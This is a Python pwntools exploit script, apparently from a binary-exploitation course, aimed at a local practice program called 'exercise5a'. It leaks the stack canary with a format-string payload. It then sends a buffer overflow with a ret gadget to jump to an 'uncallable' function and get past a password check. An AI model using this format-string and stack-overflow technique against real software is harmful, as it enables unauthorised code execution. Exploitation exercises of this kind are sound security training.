#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *
from advancedpwn import ida

# Set up pwntools for the correct architecture
context.update(arch='amd64')
exe = './exercise5a'

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR

context.binary = exe
context.log_level = "critical"
proxy = None

def signal_handler(signum, frame):
    global proxy
    if proxy is not None:
        proxy.exit_process()
        log.info("Killed IDA debugger window!")
    exit(0)

signal.signal(signal.SIGINT, signal_handler)  # Add IDA killer to process kill

def exploitStart():
    global proxy
    r = context.binary.process()
    #proxy = ida.attach(r, "192.168.127.1", ida_start_port=31337, binary_path=context.binary.path)
    #===========================================================
    #                    EXPLOIT GOES HERE
    #===========================================================
    # You can now communicate with the process, e.g.,
    # p.sendline("AAAAA")
    # p.recvline()
    r.sendline(b"%p;"*15)
    leak = r.recvuntil(b"is not the password").decode()
    canary_hex = leak.split(';')[6]
    canary = int(canary_hex, 16)
    print(f"Canary? {hex(canary)}")
    # Now do the buffer overflow to get uncallable
    print(cyclic_find(0x0000000061616163)) # 8
    print(cyclic_find("aaag")) # 21
    uncallable_add = 0x0401256
    ret_gad = 0x000000000040101a # Use ret gad to fix stak alignment
    r.sendline(b"A"*0x100 + p64(canary) + b"A"*8 + b'\x00'*4 + b"CCCC" + p64(ret_gad) + p64(uncallable_add))
    #r.interactive()
    r.recvuntil(b"Authorized") # get rid of garbage
    print(r.recvall(timeout=1).decode())

if __name__ == '__main__':
    exploitStart()